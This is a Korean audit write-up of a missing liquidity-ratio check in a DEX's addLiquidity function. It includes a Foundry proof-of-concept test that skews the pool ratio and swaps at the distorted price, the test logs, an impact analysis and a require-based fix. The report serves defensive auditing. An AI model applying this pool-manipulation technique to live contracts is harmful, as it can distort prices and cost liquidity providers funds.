# DEX - addLiquidity의 유동성 공급비 검증의 부재

## 설명

<aside>

### **키워드 : Vulnerability - 유동성 풀 조작**

### **심각도 : Critical**

`addLiquidity` 함수내부에서 두 토큰의 유동성 공급량 비율에 대한 검증이 이루어지지 않는다.
이를 악용하여 유동성 풀에 원하는 비율로 토큰을 공급하여 교환비를 조작할 수 있다.

</aside>

```solidity
if (totalSupply_ == 0) {
            //if first supply
            LPTokenAmount = _sqrt(tokenXAmount * tokenYAmount);
        } else {
            // calculate over the before
            liqX = _mul(tokenXAmount, totalSupply_) / amountX;
            liqY = _mul(tokenYAmount, totalSupply_) / amountY;
            LPTokenAmount = (liqX < liqY) ? liqX : liqY;
        }
```

유동성 풀에 초기에 공급된 비율로 공급되는지 검사하고 이를 유동성 풀의 비율이 깨지지 않게 공급되도록 유도해야 한다. 하지만 이에 대한 검증이 이루어지지 않고 유동성 풀에 공급하게 된다.

그리고 이때 LP토큰 발행량은 tokenXAmount에 의존하여 발행된다.

따라서 유동성 풀의 비율을 임의로 조작할 수 있고 이는 곧 적절하지 못한 가격으로 토큰을 교환할 수 있으며 LP토큰의 발행량이 잘못 책정되는 요인이 된다.

## PoC

```solidity
function testPOC() external {
        tokenX.transfer(address(0x01), 1 ether);
        tokenY.transfer(address(0x01), 100 ether);

        tokenX.transfer(address(0x02), 100 ether);
        tokenY.transfer(address(0x02), 5002 ether);
        uint256 LP1;
        vm.startPrank(address(0x01));
        {
            tokenX.approve(address(dex), type(uint).max);
            tokenY.approve(address(dex), type(uint).max);
            LP1 = dex.addLiquidity(1 ether, 100 ether, 0);
            console.log("LP1", LP1);
        }
        vm.stopPrank();

        vm.startPrank(address(0x02));
        {
            tokenX.approve(address(dex), type(uint).max);
            tokenY.approve(address(dex), type(uint).max);
            uint256 lp = dex.addLiquidity(100 ether, 1 ether, 0);
            console.log("LP2", lp);

            console.log(
                "user 2 : before swap balance",
                tokenX.balanceOf(address(0x02)),
                tokenY.balanceOf(address(0x02))
            );
            uint res = dex.swap(0, 5001 ether, 0);
            console.log(
                "user 2 : after swap balance",
                tokenX.balanceOf(address(0x02)),
                tokenY.balanceOf(address(0x02))
            );

            dex.removeLiquidity(lp, 0, 0);
            console.log(
                "user 2 : Attack result",
                tokenX.balanceOf(address(0x02)),
                tokenY.balanceOf(address(0x02))
            );
        }
        vm.stopPrank();
}
```

```solidity
Running 1 test for test/Dex.t.sol:DexTest
[PASS] testPOC() (gas: 444939)
Logs:
  LP1 10000000000000000000
  LP2 100000000000000000
  user 2 : before swap balance 0 101000000000000000000
  user 2 : after swap balance 50474737368684342171 0
  user 2 : Attack result 50974987493746873436 2000000000000000000
```

초기 유동성 풀에 A가 x토큰과 y토큰을 1:100 비율로 토큰을 공급한다. 이는 곧 실제 토큰의 가치에 따른 교환비라고 볼 수 있다.

이때 유저 B가 기존의 유동성 비율과는 무관하게 x토큰과 y토큰을 100:1 비율로 공급한다. 이때 유동성 풀에는 1:1 로 토큰이 존재한다. 이후 swap을 통해 y토큰을 x토큰으로 변환한다.

유동성풀의 비율이 본래 가치를 따르지 않고 잘못된 토큰 비율로 계산되어 변환된다.

이 결과로 본래 가치는 100:1 이지만 교환의 결과는 y토큰 101개가 x토큰 약 50개로 변환되는 것을 확인가능하다. 해당 DEX의 유동성 풀의 비율이 깨졌기 때문이다.

하지만 이후 LP토큰을 반환하여 유동성을 제거하는 상황을 보면 이전 최영현 드리머 코드에서 발견된 취약점과는 사뭇 다르다. 유저 B의 토큰 발행량은 X토큰 공급량과 Y토큰 공급량 중 적은 쪽으로 토큰이 발행되었기에 y토큰 1개 만큼의 교환비로 공급하였다고 계산하여 1/101의 지분만큼 토큰이 발급된다.

초기 자본은 x토큰 100 ether, y토큰 102 ether였지만, 교환 이후에는 약 50 ether, 2 ether가 발급된다.

즉, 이를 통해 공격자가 이득을 취할 수 있는 방법은 없다. 결국 공격자가 공급한 공급량으로 조작된 교환 비율은 공급자 모두가 지분대로 나눠서 이득을 보는 구조이기에, 공격자는 조작된 가격으로 교환을 하거나, 사전에 토큰을 발행해놓더라도 공격을 위한 투자금을 회수하기조차 힘들다.

## 파급력

유동성 풀의 비율이 깨지고 이로 인해 교환비가 깨지는 것은 DEX의 주요 기능이 정상작동하지 않음을 의미한다. 하지만 이를 이용해 누군가가 이득을 취할 수 있는 구조는 아니다.

유저의 실수로 토큰을 잘못된 비율로 공급할 경우 그대로 처리되지만 토큰은 적게 발행되어 유저의 손실이 발생할 수 있다. 잘못된 비율로 공급된 토큰은 이후 다른 유저들이 토큰을 교환하거나 공급성을 제거함으로써 이득을 취할 수 있게 된다.

이를 악용하여 공격자(개인 혹은 집단)가 직접 유동성 풀의 비율을 조작하여 투자금보다 더 많은 금액을 획득할 수는 없다. 하지만 공격자가 악용할 수 있는 여지는 있다. 다른 유저들이 잘못된 비율로 공급하도록 유도하거나 이를 감지하여 토큰의 가치가 잘못 메겨지면 토큰을 교환하거나 유동성을 제거하는 봇을 만들어 이득을 취하는 방법 정도는 존재한다.

하지만 공격자가 이득을 취할 수 있는가와는 별개로, DEX의 핵심 기능을 해칠 수 있는 취약점이라고 판단하여 위험도를 매우 높음으로 판단하였다.

## 해결 방안

```solidity
if (totalSupply_ == 0) {
            //if first supply
            LPTokenAmount = _sqrt(tokenXAmount * tokenYAmount);
        } else {
            // calculate over the before
            require(
                tokenXAmount * amountY == tokenYAmount * amountX,
                "imbalance add liquidity"
            );
            liqX = _mul(tokenXAmount, totalSupply_) / amountX;
            liqY = _mul(tokenYAmount, totalSupply_) / amountY;
            LPTokenAmount = (liqX < liqY) ? liqX : liqY;
        }
```

초회 공급이 아닌 경우에는 공급비가 유동성 풀의 비율과 동일한지 검사해야 한다.
